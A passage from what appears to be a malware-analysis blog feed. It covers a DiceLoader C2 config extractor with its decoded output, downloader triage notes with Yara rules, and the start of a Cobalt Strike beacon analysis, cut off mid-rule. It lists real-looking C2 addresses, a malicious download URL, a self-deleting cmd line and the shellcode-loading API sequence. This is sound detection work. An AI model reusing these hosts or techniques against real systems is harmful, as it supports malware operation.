mov ebp, 1Fh # 4C 8D 05 68 1E 00 00 lea r8, key # 44 8B CD mov r9d, ebp # 49 8B CE mov rcx, r14 # 8D 75 F7 lea esi, [rbp-9] # 8B D6 mov edx, esi # E8 50 FE FF FF call sub_7FFA3BA420B8 egg = rb&#39; xBD x1F x00 x00 x00 x4C x8D x05(....)&#39; key = None for m in re.finditer(egg, file_data): rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 print(f&quot;rel offset: {hex(rel_offset)}&quot;) # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() + 5 print(f&quot;match offset: {hex(match_offset)}&quot;) match_rva = pe.get_rva_from_offset(match_offset) print(f&quot;match rva: {hex(match_rva)}&quot;) key_rva = match_rva + rel_offset print(f&quot;key rva: {hex(key_rva)}&quot;) key_offset = pe.get_offset_from_rva(key_rva) print(f&quot;key offset: {hex(key_offset)}&quot;) key = file_data[key_offset:key_offset+31] print(tohex(key)) # Use the key position to locate the other two data blobs blob1 = file_data[data_section_offset:key_offset] blob2 = file_data[key_offset+31:data_section_end_offset] out_blob1 = xor_decrypt(blob1, key) print(tohex(out_blob1[:20])) port = struct.unpack(&#39;&gt;H&#39;,out_blob1[:2])[0] print(f&quot;Port: {port}&quot;) out_blob2 = xor_decrypt(blob2.lstrip(b&#39; x00&#39;), key) c2_ips = out_blob2.split(b&#39; x00&#39;)[0].split(b&#39;|&#39;) for c2 in c2_ips: print(f&quot;c2: {c2}&quot;) . rel offset: 0x1e6f match offset: 0x1651 match rva: 0x2251 key rva: 0x40c0 key offset: 0x2ec0 b&#39;d78ad7388e21900836048ecf3f6dfd67349f5620d616d9f81e9d9c4892a159&#39; b&#39;01bb0111bb010000001eba4105c94ba5875574b7&#39; Port: 443 c2: b&#39;194.180.174.86&#39; c2: b&#39;193.42.36.231&#39; . FILE_PATH = &#39;/tmp/7747707df3951b0de6b9a18f7597fb2819009163f61186393798a6167897e2f8.bin&#39; file_data = open(FILE_PATH, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) data_section_offset= None data_section_end_offset = None for s in pe.sections: if b&#39;.data x00&#39; in s.Name: data_section_offset = s.PointerToRawData data_section_end_offset = s.PointerToRawData + s.SizeOfRawData break # 48 8D 15 80 23 00 00 lea rdx, key # 8A 04 10 mov al, [rax+rdx] # 41 30 01 xor [r9], al egg = rb&#39; x48 x8D x15(....) x8A x04 x10 x41 x30 x01&#39; key = None for m in re.finditer(egg, file_data): rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 print(f&quot;rel offset: {hex(rel_offset)}&quot;) # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() print(f&quot;match offset: {hex(match_offset)}&quot;) match_rva = pe.get_rva_from_offset(match_offset) print(f&quot;match rva: {hex(match_rva)}&quot;) key_rva = match_rva + rel_offset print(f&quot;key rva: {hex(key_rva)}&quot;) key_offset = pe.get_offset_from_rva(key_rva) print(f&quot;key offset: {hex(key_offset)}&quot;) key = file_data[key_offset:key_offset+31] print(tohex(key)) # Use the key position to locate the other two data blobs blob1 = file_data[data_section_offset:key_offset] blob2 = file_data[key_offset+31:data_section_end_offset] out_blob1 = xor_decrypt(blob1, key) print(tohex(out_blob1[:20])) port = struct.unpack(&#39;&gt;H&#39;,out_blob1[:2])[0] print(f&quot;Port: {port}&quot;) out_blob2 = xor_decrypt(blob2.lstrip(b&#39; x00&#39;), key) c2_ips = out_blob2.split(b&#39; x00&#39;)[0].split(b&#39;|&#39;) for c2 in c2_ips: print(f&quot;c2: {c2}&quot;) . rel offset: 0x2387 match offset: 0x1139 match rva: 0x1d39 key rva: 0x40c0 key offset: 0x2ac0 b&#39;b54c55213e963325fba55eb30c987148f0e8b9165e884bf0f6ed190c1d3d4b&#39; b&#39;01990501bb01015000013500000000f7eb5785b7&#39; Port: 409 c2: b&#39;195.123.227.40&#39; . def parse_ports(data): out_ports = [] for ptr in range(0,len(data)-3,3): if data[ptr] == 0: break tmp_port = struct.unpack(&#39;&lt;H&#39;,data[ptr+1:ptr+3])[0] out_ports.append(tmp_port) return out_ports parse_ports(unhex(&#39;01990501bb01015000013500000000f7eb5785b7&#39;)) . [1433, 443, 80, 53] . Final Config Extractor . import pefile import struct import re def xor_decrypt(data, key): out = [] for i in range(len(data)): out.append(data[i] ^ key[i%len(key)]) return bytes(out) def get_key_offset(pe, file_data): # Try new method first -- key is passed as an argument # # BD 1F 00 00 00 mov ebp, 1Fh # 4C 8D 05 68 1E 00 00 lea r8, key # 44 8B CD mov r9d, ebp # 49 8B CE mov rcx, r14 # 8D 75 F7 lea esi, [rbp-9] # 8B D6 mov edx, esi # E8 50 FE FF FF call sub_7FFA3BA420B8 egg = rb&#39; xBD x1F x00 x00 x00 x4C x8D x05(....)&#39; for m in re.finditer(egg, file_data): try: rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() + 5 match_rva = pe.get_rva_from_offset(match_offset) key_rva = match_rva + rel_offset key_offset = pe.get_offset_from_rva(key_rva) # Return if we have something return key_offset except Exception: continue # If we are here the new method didn&#39;t work let&#39;s try the old method # The key is directly referenced in a crypto routine # 48 8D 15 80 23 00 00 lea rdx, key # 8A 04 10 mov al, [rax+rdx] # 41 30 01 xor [r9], al egg = rb&#39; x48 x8D x15(....) x8A x04 x10 x41 x30 x01&#39; for m in re.finditer(egg, file_data): try: rel_offset = struct.unpack(&#39;&lt;I&#39;,m.group(1))[0] # Remember to add 7 for the 7 bytes in the instruction rel_offset += 7 # Remember that this is in the .text section which is loaded before the .data # so the relative will be postive displacement match_offset = m.start() match_rva = pe.get_rva_from_offset(match_offset) key_rva = match_rva + rel_offset key_offset = pe.get_offset_from_rva(key_rva) # Return if we have something return key_offset except Exception: continue # If we got here we failed return None def get_data_section_bounds(pe): data_section_offset= None data_section_end_offset = None for s in pe.sections: if b&#39;.data x00&#39; in s.Name: data_section_offset = s.PointerToRawData data_section_end_offset = s.PointerToRawData + s.SizeOfRawData break return data_section_offset,data_section_end_offset def parse_ports(data): out_ports = [] for ptr in range(0,len(data)-3,3): if data[ptr] == 0: break tmp_port = struct.unpack(&#39;&lt;H&#39;,data[ptr+1:ptr+3])[0] out_ports.append(tmp_port) return out_ports def get_config(data): c2s = [] pe = pefile.PE(data=file_data) key_offset = get_key_offset(pe, file_data) if key_offset is None: print(&quot;Error - no key offset found!&quot;) return c2s key = file_data[key_offset:key_offset+31] data_section_offset,data_section_end_offset = get_data_section_bounds(pe) if data_section_offset is None: print(&quot;Error - no .data section&quot;) return c2s ports_data = file_data[data_section_offset:key_offset] ips_data = file_data[key_offset+31:data_section_end_offset] ports_ptxt_data = xor_decrypt(ports_data, key) ports = parse_ports(ports_ptxt_data) ports = set(ports) ips_ptxt_data = xor_decrypt(ips_data.lstrip(b&#39; x00&#39;), key) c2_ips = ips_ptxt_data.split(b&#39; x00&#39;)[0].split(b&#39;|&#39;) # Sometimes the port data is messed up # In this case just skip it if len(ports) == 0 or len(ports) &gt; 5: return [ip.decode(&#39;ascii&#39;) for ip in c2_ips] for ip in c2_ips: for port in ports: c2s.append(ip.decode(&#39;ascii&#39;)+&quot;:&quot;+str(port)) return c2s . targets = [&quot;/tmp/diceloader/2d88767c424d05330839e568b32f9f52962df56b1d3021f69930167fe623efd1.exe&quot;, &quot;/tmp/diceloader/0f76768f65775329d7a0ddb977ea822d992d086ce48a23679cef66e3b4d2f4ed.exe&quot;, &quot;/tmp/diceloader/extracted_implant.bin&quot;, &quot;/tmp/diceloader/bc3ce7f2ea9d33374a1373965625b7d0d6a010a2de5ddccbb8e1d819622187c6.exe&quot;, &quot;/tmp/diceloader/f32b8b0530ed068b47817d165064e99800a44a943ccae0e32f6b6b3e40c79638.exe&quot;, &quot;/tmp/7747707df3951b0de6b9a18f7597fb2819009163f61186393798a6167897e2f8.bin&quot;, &quot;/tmp/diceloader2.bin&quot;, &quot;/tmp/087435ef6cddc58d40ba6ba8b4bb60b2ead9873bf1cb5c0702bbf31e3199b343.bin&quot;, &quot;/tmp/met.bin&quot;, &quot;/tmp/diceloader.bin&quot;, &quot;/tmp/4d933b6b60a097ad5ce5876a66c569e6f46707b934ebd3c442432711af195124.bin&quot;, &quot;/tmp/2d88767c4.bin&quot;, &quot;/tmp/dicefail.bin&quot;] for fp in targets: file_data = open(fp, &#39;rb&#39;).read() print(get_config(file_data)) . [&#39;46.17.107.7:443&#39;, &#39;185.250.151.33:443&#39;] [&#39;46.17.107.32:443&#39;, &#39;185.250.151.141:443&#39;] [&#39;195.123.227.40:80&#39;, &#39;195.123.227.40:1433&#39;, &#39;195.123.227.40:443&#39;, &#39;195.123.227.40:53&#39;] [&#39;185.232.170.205:443&#39;, &#39;94.140.114.173:443&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] [&#39;195.123.227.40:80&#39;, &#39;195.123.227.40:1433&#39;, &#39;195.123.227.40:443&#39;, &#39;195.123.227.40:53&#39;] [&#39;194.180.174.86:443&#39;, &#39;193.42.36.231:443&#39;] [&#39;194.180.174.86:443&#39;, &#39;193.42.36.231:443&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] [&#39;195.123.214.181:443&#39;] [&#39;46.17.107.7:443&#39;, &#39;185.250.151.33:443&#39;] [&#39;185.172.129.35&#39;, &#39;94.158.244.205&#39;] .",
            "url": "https://research.openanalysis.net/downloader/diceloader/yara/triage/2022/06/16/diceloader.html",
            "relUrl": "/downloader/diceloader/yara/triage/2022/06/16/diceloader.html",
            "date": " • Jun 16, 2022"
        }
        
    
  
    
        ,"post3": {
            "title": "Malware Downloader Triage Notes",
            "content": "Overview . We are going to take a look at two different downloaders, which are so simple they don&#39;t have great static detection or information extraction in UnpacMe yet! Our goal is to generate some Yara rules, or maybe some code to identify and extract the relevant info (download URL) in a generic static way. . Samples . 1a10e2940151982f2ab4f1e62be6e4f53074a2ffb90c7977e16d6a183db98695 | 9211ebf25c3cd3641451c95c50c1d3b7b2a4c53c36fa36564f3c1a177a0cda3d | . Triage of 9211... . The samples has a plaintext URL and the download functionality is not obfuscated/packed and can be identifed using CAPA as seen in UnpacMe. . The hardcoded URL is: http://apuservis.pe/ocultar/fw%d.exe. . There are 2 loops used to generate ULRs from 1 - 7 calling the URLs: . http://apuservis.pe/ocultar/fw1.exe | http://apuservis.pe/ocultar/fw2.exe | http://apuservis.pe/ocultar/fw3.exe | http://apuservis.pe/ocultar/fw4.exe | http://apuservis.pe/ocultar/fw5.exe | http://apuservis.pe/ocultar/fw6.exe | . The file is writtent to %APPDATA% with a random file name using a random number &quot;%08x.exe. . To execute the file the API ShellExecuteW is resolved dynamically using a CRC32 hash then it is called with the open command. . import requests HASHDB_HUNT_URL = &#39;https://hashdb.openanalysis.net/hunt&#39; HASHDB_HASH_URL = &#39;https://hashdb.openanalysis.net/hash&#39; api_hash = 0x1FA8A1D4 + 5 hunt_request = {&quot;hashes&quot;: [api_hash]} r = requests.post(HASHDB_HUNT_URL, json=hunt_request) print(r.json()) . {&#39;hits&#39;: [{&#39;algorithm&#39;: &#39;crc32&#39;, &#39;count&#39;: 1, &#39;hitrate&#39;: 1.0}]} . r = requests.get(HASHDB_HASH_URL + &#39;/crc32/&#39; + str(api_hash)) print(r.json()) . {&#39;hashes&#39;: [{&#39;hash&#39;: 531145177, &#39;string&#39;: {&#39;string&#39;: &#39;ShellExecuteW&#39;, &#39;is_api&#39;: True, &#39;permutation&#39;: &#39;api&#39;, &#39;api&#39;: &#39;ShellExecuteW&#39;, &#39;modules&#39;: [&#39;shell32&#39;]}}]} . Possible IOCs . There is self-delete functionatlity using the batch script: /c ping 127.0.0.1 &amp;&amp; del &quot;%s &quot; &gt;&gt; NUL . | They use GetEnvironmentVariableW(L&quot;ComSpec&quot;, Filename, 0x104u) to get the cmd.exe path. . | They have a hardcoded URL http://apuservis.pe/ocultar/fw%d.exe . | They have a hardcoded HTTP header GET %S HTTP/1.1 . | They have a CRC32 hash algo used for the dynamic API resolving . | . Yara rule . rule download_hunt { meta: description = &quot;Hunt for simple downloaders&quot; strings: $s1 = &quot;/c ping 127.0.0.1 &amp;&amp; del &quot;%s &quot; &gt;&gt; NUL&quot; wide ascii nocase $s2 = &quot;http://&quot; wide ascii $s3 = &quot;GET %S HTTP/1.1&quot; wide ascii nocase $x1 = { 35 20 83 B8 ED } $x2 = { 81 F? 20 83 B8 ED } condition: all of ($s*) and 1 of ($x*) } . ** let&#39;s also check file size . ** these are small binaries with very few functions, one ID trick might be to try and identify how many functions and only trigger an bins with a few functions... for this we could maybe used CFG count... from @psifertex . You can see the function table from a CFG binary with dumpbin /loadconfig test.exe . Yara Rule Revisions . We ran a scan with the above rule over the MalwareBazaar corpus and the results only gave us one match (the sample we were originally looking at). This is a bad rule. We are going to loosen the rule to see if we can catch more samples. . rule download_hunt_2 { meta: description = &quot;Hunt for simple downloaders&quot; strings: $s1 = &quot;/c ping 127.0.0.1 &amp;&amp; del&quot; wide ascii xor $s2 = &quot;http://&quot; wide ascii xor condition: all of ($s*) } . . Triage of 1a10e... . &quot;企划营销岗位_徐浩阳_硕士.exe&quot;: 1a10e2940151982f2ab4f1e62be6e4f53074a2ffb90c7977e16d6a183db98695139.9.138[.]190 pic.twitter.com/pquwEW1ZW0 . &mdash; MalwareHunterTeam (@malwrhunterteam) June 11, 2022 . There is a PDB path in the binary C: Users H0e4a0r1t Documents Visual Studio 2015 Projects worddy x64 Release worddy.pdb. Based on the username H0e4a0r1t we found a possible GitHub https://github.com/h0e4a0r1t and this looks like maybe a &quot;redteam&quot; tools developer?? . Possible IOCs . There is an embeded blob that is encrypted with a singl-byte XOR 0x99 . | Once decrypted the blob is a standard Cobalt Strike loader with the following &quot;header&quot; strings. . | . Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: http://code.jquery.com/ Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko . The C2 IP is 139.9.138.190 . | To load and launch the decrypted shellcode they use the following APIs . VirtualAlloc | WriteProcessMemory | QueueUserAPC | . | . Yara Rule . rule cs_downloader { meta: description = &quot;Hunt for Cobalt Strike downloader&quot; strings: $s1 = &quot;Accept-Language:&quot; xor(0x01-0xff) $s2 = &quot;Referer: http://code.jquery.com/&quot; xor(0x01-0xff) $s3 = &quot;Accept-Encoding: gzip, deflate&quot; xor(0x01-0xff) $s4 = &quot;User-Agent:&quot; xor(0x01-0xff) condition: all of ($s*) and uint32(@s1) == uint32(@s3) } . Yara Results . We only got 2 hits, this rule also sucks, lol! . [ { &quot;rule&quot;: &quot;cs_downloader&quot;, &quot;malware&quot;: &quot;CobaltStrike&quot;, &quot;sha256&quot;: &quot;e54514b1164508c049733c7dafc97f24ae66d42b8146b0e1a1271f9af7c94d48&quot;, &quot;mime_type&quot;: &quot;application/x-msdownload&quot;, &quot;virustotal_link&quot;: &quot;https://www.virustotal.com/gui/file/e54514b1164508c049733c7dafc97f24ae66d42b8146b0e1a1271f9af7c94d48/detection&quot;, &quot;malwarebazaar_link&quot;: &quot;https://bazaar.abuse.ch/sample/e54514b1164508c049733c7dafc97f24ae66d42b8146b0e1a1271f9af7c94d48/&quot;, &quot;tags&quot;: [] }, { &quot;rule&quot;: &quot;cs_downloader&quot;, &quot;malware&quot;: &quot;CobaltStrike&quot;, &quot;sha256&quot;: &quot;6220127ada00d84b58d718152748cd2c62007b1de92201701dc2968d2b00e31f&quot;, &quot;mime_type&quot;: &quot;application/x-msdownload&quot;, &quot;virustotal_link&quot;: &quot;https://www.virustotal.com/gui/file/6220127ada00d84b58d718152748cd2c62007b1de92201701dc2968d2b00e31f/detection&quot;, &quot;malwarebazaar_link&quot;: &quot;https://bazaar.abuse.ch/sample/6220127ada00d84b58d718152748cd2c62007b1de92201701dc2968d2b00e31f/&quot;, &quot;tags&quot;: [] } ] .",
            "url": "https://research.openanalysis.net/downloader/research/detection_engineering/yara/triage/2022/06/12/downloader-triage.html",
            "relUrl": "/downloader/research/detection_engineering/yara/triage/2022/06/12/downloader-triage.html",
            "date": " • Jun 12, 2022"
        }
        
    
  
    
        ,"post4": {
            "title": "Cobalt Strike Analysis",
            "content": "Overview . Samples . Malware Bazaar CobaltStrike Tags | unpacked - ca847340992ff249d8b4425a942d96be6a9380a381123c693475030fd598e5d5 | unpacked - 95c50f8c585ec69dab7a9d26a2684da2e44d5539edb75e4ecc53c18092cdc7b1 | unpacked - 36cfac5ccea3f56d8e042bf81fecdc82652c5b9665dbc46da5070384e3b4664e | emotet packed - 191038e4da8d2913c4aae01723d786fca9c34e2e531d56807742e9470ef54afb | . References . scemu sellcode analysis tool | scdbg blog | scdbg github | dumpulator | CS beacon config extract (sentinal-one github) | Cobalt Strike&#39;s Malleable C2 under the hood | Malleable Command and Control | Didier Stevens CS analysis tools | . Config Extraction . The CS beacon config data can either exit as plaintext, or encrypted with a single byte XOR. There is a pattern in the config 00 01 00 01 00 02 that can be used to identify it even when encrypted, by brute forcing the XOR. Once the config has been identified the Sentinal-One CS beacon config extractor will work to extract the config. One upgrade that can be made to the extractor is to make the decrytion generic (currently it only supports the XOR keys 0x69 and 0x2e. . Given the above, the main challenge is to unpack and identify the CS beacon in packed samples. We can use the following Yara rule to ID beacons where the config can be extracted. . Reflective Loader PE Header (DOS Header) . In addition to this yara rule there is also an interesting characteristic in the PE file DOS header of CS beacons that use a reflective loader. The normal M Z 0x90 0x00 bytes are replaced with M Z A R U H. This has been used by other Yara rules to identify the beacon PE, but in our research we found that simply identifying the encrypted payload bytes was enough. . Yara Rule . This is rule that will match the beacon (encrypted) payload . rule CobaltStrike_C2_Encoded_XOR_Config_Indicator { meta: description = &quot;Detects CobaltStrike C2 encoded profile configuration&quot; author = &quot;yara@s3c.za.net&quot; date = &quot;2021-07-08&quot; strings: $s000 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 03 00 02 00 04 ?? ?? ?? ?? 00 04 00 02 00 04 ?? ?? ?? ?? 00 05 00 01 00 02 ?? ?? } $s001 = { 01 00 01 00 01 03 ?? ?? 01 03 01 00 01 03 ?? ?? 01 02 01 03 01 05 ?? ?? ?? ?? 01 05 01 03 01 05 ?? ?? ?? ?? 01 04 01 00 01 03 ?? ?? } $s002 = { 02 03 02 03 02 00 ?? ?? 02 00 02 03 02 00 ?? ?? 02 01 02 00 02 06 ?? ?? ?? ?? 02 06 02 00 02 06 ?? ?? ?? ?? 02 07 02 03 02 00 ?? ?? } $s003 = { 03 02 03 02 03 01 ?? ?? 03 01 03 02 03 01 ?? ?? 03 00 03 01 03 07 ?? ?? ?? ?? 03 07 03 01 03 07 ?? ?? ?? ?? 03 06 03 02 03 01 ?? ?? } $s004 = { 04 05 04 05 04 06 ?? ?? 04 06 04 05 04 06 ?? ?? 04 07 04 06 04 00 ?? ?? ?? ?? 04 00 04 06 04 00 ?? ?? ?? ?? 04 01 04 05 04 06 ?? ?? } $s005 = { 05 04 05 04 05 07 ?? ?? 05 07 05 04 05 07 ?? ?? 05 06 05 07 05 01 ?? ?? ?? ?? 05 01 05 07 05 01 ?? ?? ?? ?? 05 00 05 04 05 07 ?? ?? } $s006 = { 06 07 06 07 06 04 ?? ?? 06 04 06 07 06 04 ?? ?? 06 05 06 04 06 02 ?? ?? ?? ?? 06 02 06 04 06 02 ?? ?? ?? ?? 06 03 06 07 06 04 ?? ?? } $s007 = { 07 06 07 06 07 05 ?? ?? 07 05 07 06 07 05 ?? ?? 07 04 07 05 07 03 ?? ?? ?? ?? 07 03 07 05 07 03 ?? ?? ?? ?? 07 02 07 06 07 05 ?? ?? } $s008 = { 08 09 08 09 08 0A ?? ?? 08 0A 08 09 08 0A ?? ?? 08 0B 08 0A 08 0C ?? ?? ?? ?? 08 0C 08 0A 08 0C ?? ?? ?? ?? 08 0D 08 09 08 0A ?? ?? } $s009 = { 09 08 09 08 09 0B ?? ?? 09 0B 09 08 09 0B ?? ?? 09 0A 09 0B 09 0D ?? ?? ?? ?? 09 0D 09 0B 09 0D ?? ?? ?? ?? 09 0C 09 08 09 0B ?? ?? } $s010 = { 0A 0B 0A 0B 0A 08 ?? ?? 0A 08 0A 0B 0A 08 ?? ?? 0A 09 0A 08 0A 0E ?? ?? ?? ?? 0A 0E 0A 08 0A 0E ?? ?? ?? ?? 0A 0F 0A 0B 0A 08 ?? ?? } $s011 = { 0B 0A 0B 0A 0B 09 ?? ?? 0B 09 0B 0A 0B 09 ?? ?? 0B 08 0B 09 0B 0F ?? ?? ?? ?? 0B 0F 0B 09 0B 0F ?? ?? ?? ?? 0B 0E 0B 0A 0B 09 ?? ?? } $s012 = { 0C 0D 0C 0D 0C 0E ?? ?? 0C 0E 0C 0D 0C 0E ?? ?? 0C 0F 0C 0E 0C 08 ?? ?? ?? ?? 0C 08 0C 0E 0C 08 ?? ?? ?? ?? 0C 09 0C 0D 0C 0E ?? ?? } $s013 = { 0D 0C 0D 0C 0D 0F ?? ?? 0D 0F 0D 0C 0D 0F ?? ?? 0D 0E 0D 0F 0D 09 ?? ?? ?? ?? 0D 09 0D 0F 0D 09 ?? ?? ?? ?? 0D 08 0D 0C 0D 0F ?? ?? } $s014 = { 0E 0F 0E 0F 0E 0C ?? ?? 0E 0C 0E 0F 0E 0C ?? ?? 0E 0D 0E 0C 0E 0A ?? ?? ?? ?? 0E 0A 0E 0C 0E 0A ?? ?? ?? ?? 0E 0B 0E 0F 0E 0C ?? ?? } $s015 = { 0F 0E 0F 0E 0F 0D ?? ?? 0F 0D 0F 0E 0F 0D ?? ?? 0F 0C 0F 0D 0F 0B ?? ?? ?? ?? 0F 0B 0F 0D 0F 0B ?? ?? ?? ?? 0F 0A 0F 0E 0F 0D ?? ?? } $s016 = { 10 11 10 11 10 12 ?? ?? 10 12 10 11 10 12 ?? ?? 10 13 10 12 10 14 ?? ?? ?? ?? 10 14 10 12 10 14 ?? ?? ?? ?? 10 15 10 11 10 12 ?? ?? } $s017 = { 11 10 11 10 11 13 ?? ?? 11 13 11 10 11 13 ?? ?? 11 12 11 13 11 15 ?? ?? ?? ?? 11 15 11 13 11 15 ?? ?? ?? ?? 11 14 11 10 11 13 ?? ?? } $s018 = { 12 13 12 13 12 10 ?? ?? 12 10 12 13 12 10 ?? ?? 12 11 12 10 12 16 ?? ?? ?? ?? 12 16 12 10 12 16 ?? ?? ?? ?? 12 17 12 13 12 10 ?? ?? } $s019 = { 13 12 13 12 13 11 ?? ?? 13 11 13 12 13 11 ?? ?? 13 10 13 11 13 17 ?? ?? ?? ?? 13 17 13 11 13 17 ?? ?? ?? ?? 13 16 13 12 13 11 ?? ?? } $s020 = { 14 15 14 15 14 16 ?? ?? 14 16 14 15 14 16 ?? ?? 14 17 14 16 14 10 ?? ?? ?? ?? 14 10 14 16 14 10 ?? ?? ?? ?? 14 11 14 15 14 16 ?? ?? } $s021 = { 15 14 15 14 15 17 ?? ?? 15 17 15 14 15 17 ?? ?? 15 16 15 17 15 11 ?? ?? ?? ?? 15 11 15 17 15 11 ?? ?? ?? ?? 15 10 15 14 15 17 ?? ?? } $s022 = { 16 17 16 17 16 14 ?? ?? 16 14 16 17 16 14 ?? ?? 16 15 16 14 16 12 ?? ?? ?? ?? 16 12 16 14 16 12 ?? ?? ?? ?? 16 13 16 17 16 14 ?? ?? } $s023 = { 17 16 17 16 17 15 ?? ?? 17 15 17 16 17 15 ?? ?? 17 14 17 15 17 13 ?? ?? ?? ?? 17 13 17 15 17 13 ?? ?? ?? ?? 17 12 17 16 17 15 ?? ?? } $s024 = { 18 19 18 19 18 1A ?? ?? 18 1A 18 19 18 1A ?? ?? 18 1B 18 1A 18 1C ?? ?? ?? ?? 18 1C 18 1A 18 1C ?? ?? ?? ?? 18 1D 18 19 18 1A ?? ?? } $s025 = { 19 18 19 18 19 1B ?? ?? 19 1B 19 18 19 1B ?? ?? 19 1A 19 1B 19 1D ?? ?? ?? ?? 19 1D 19 1B 19 1D ?? ?? ?? ?? 19 1C 19 18 19 1B ?? ?? } $s026 = { 1A 1B 1A 1B 1A 18 ?? ?? 1A 18 1A 1B 1A 18 ?? ?? 1A 19 1A 18 1A 1E ?? ?? ?? ?? 1A 1E 1A 18 1A 1E ?? ?? ?? ?? 1A 1F 1A 1B 1A 18 ?? ?? } $s027 = { 1B 1A 1B 1A 1B 19 ?? ?? 1B 19 1B 1A 1B 19 ?? ?? 1B 18 1B 19 1B 1F ?? ?? ?? ?? 1B 1F 1B 19 1B 1F ?? ?? ?? ?? 1B 1E 1B 1A 1B 19 ?? ?? } $s028 = { 1C 1D 1C 1D 1C 1E ?? ?? 1C 1E 1C 1D 1C 1E ?? ?? 1C 1F 1C 1E 1C 18 ?? ?? ?? ?? 1C 18 1C 1E 1C 18 ?? ?? ?? ?? 1C 19 1C 1D 1C 1E ?? ?? } $s029 = { 1D 1C 1D 1C 1D 1F ?? ?? 1D 1F 1D 1C 1D 1F ?? ?? 1D 1E 1D 1F 1D 19 ?? ?? ?? ?? 1D 19 1D 1F 1D 19 ?? ?? ?? ?? 1D 18 1D 1C 1D 1F ?? ?? } $s030 = { 1E 1F 1E 1F 1E 1C ?? ?? 1E 1C 1E 1F 1E 1C ?? ?? 1E 1D 1E 1C 1E 1A ?? ?? ?? ?? 1E 1A 1E 1C 1E 1A ?? ?? ?? ?? 1E 1B 1E 1F 1E 1C ?? ?? } $s031 = { 1F 1E 1F 1E 1F 1D ?? ?? 1F 1D 1F 1E 1F 1D ?? ?? 1F 1C 1F 1D 1F 1B ?? ?? ?? ?? 1F 1B 1F 1D 1F 1B ?? ?? ?? ?? 1F 1A 1F 1E 1F 1D ?? ?? } $s032 = { 20 21 20 21 20 22 ?? ?? 20 22 20 21 20 22 ?? ?? 20 23 20 22 20 24 ?? ?? ?? ?? 20 24 20 22 20 24 ?? ?? ?? ?? 20 25 20 21 20 22 ?? ?? } $s033 = { 21 20 21 20 21 23 ?? ?? 21 23 21 20 21 23 ?? ?? 21 22 21 23 21 25 ?? ?? ?? ?? 21 25 21 23 21 25 ?? ?? ?? ?? 21 24 21 20 21 23 ?? ?? } $s034 = { 22 23 22 23 22 20 ?? ?? 22 20 22 23 22 20 ?? ?? 22 21 22 20 22 26 ?? ?? ?? ?? 22 26 22 20 22 26 ?? ?? ?? ?? 22 27 22 23 22 20 ?? ?? } $s035 = { 23 22 23 22 23 21 ?? ?? 23 21 23 22 23 21 ?? ?? 23 20 23 21 23 27 ?? ?? ?? ?? 23 27 23 21 23 27 ?? ?? ?? ?? 23 26 23 22 23 21 ?? ?? } $s036 = { 24 25 24 25 24 26 ?? ?? 24 26 24 25 24 26 ?? ?? 24 27 24 26 24 20 ?? ?? ?? ?? 24 20 24 26 24 20 ?? ?? ?? ?? 24 21 24 25 24 26 ?? ?? } $s037 = { 25 24 25 24 25 27 ?? ?? 25 27 25 24 25 27 ?? ?? 25 26 25 27 25 21 ?? ?? ?? ?? 25 21 25 27 25 21 ?? ?? ?? ?? 25 20 25 24 25 27 ?? ?? } $s038 = { 26 27 26 27 26 24 ?? ?? 26 24 26 27 26 24 ?? ?? 26 25 26 24 26 22 ?? ?? ?? ?? 26 22 26 24 26 22 ?? ?? ?? ?? 26 23 26 27 26 24 ?? ?? } $s039 = { 27 26 27 26 27 25 ?? ?? 27 25 27 26 27 25 ?? ?? 27 24 27 25 27 23 ?? ?? ?? ?? 27 23 27 25 27 23 ?? ?? ?? ?? 27 22 27 26 27 25 ?? ?? } $s040 = { 28 29 28 29 28 2A ?? ?? 28 2A 28 29 28 2A ?? ?? 28 2B 28 2A 28 2C ?? ?? ?? ?? 28 2C 28 2A 28 2C ?? ?? ?? ?? 28 2D 28 29 28 2A ?? ?? } $s041 = { 29 28 29 28 29 2B ?? ?? 29 2B 29 28 29 2B ?? ?? 29 2A 29 2B 29 2D ?? ?? ?? ?? 29 2D 29 2B 29 2D ?? ?? ?? ?? 29 2C 29 28 29 2B ?? ?? } $s042 = { 2A 2B 2A 2B 2A 28 ?? ?? 2A 28 2A 2B 2A 28 ?? ?? 2A 29 2A 28 2A 2E ?? ?? ?? ?? 2A 2E 2A 28 2A 2E ?? ?? ?? ?? 2A 2F 2A 2B 2A 28 ?? ?? } $s043 = { 2B 2A 2B 2A 2B 29 ?? ?? 2B 29 2B 2A 2B 29 ?? ?? 2B 28 2B 29 2B 2F ?? ?? ?? ?? 2B 2F 2B 29 2B 2F ?? ?? ?? ?? 2B 2E 2B 2A 2B 29 ?? ?? } $s044 = { 2C 2D 2C 2D 2C 2E ?? ?? 2C 2E 2C 2D 2C 2E ?? ?? 2C 2F 2C 2E 2C 28 ?? ?? ?? ?? 2C 28 2C 2E 2C 28 ?? ?? ?? ?? 2C 29 2C 2D 2C 2E ?? ?? } $s045 = { 2D 2C 2D 2C 2D 2F ?? ?? 2D 2F 2D 2C 2D 2F ?? ?? 2D 2E 2D 2F 2D 29 ?? ?? ?? ?? 2D 29 2D 2F 2D 29 ?? ?? ?? ?? 2D 28 2D 2C 2D 2F ?? ?? } $s046 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E 2D 2E 2C 2E 2A ?? ?? ?? ?? 2E 2A 2E 2C 2E 2A ?? ?? ?? ?? 2E 2B 2E 2F 2E 2C ?? ?? } $s047 = { 2F 2E 2F 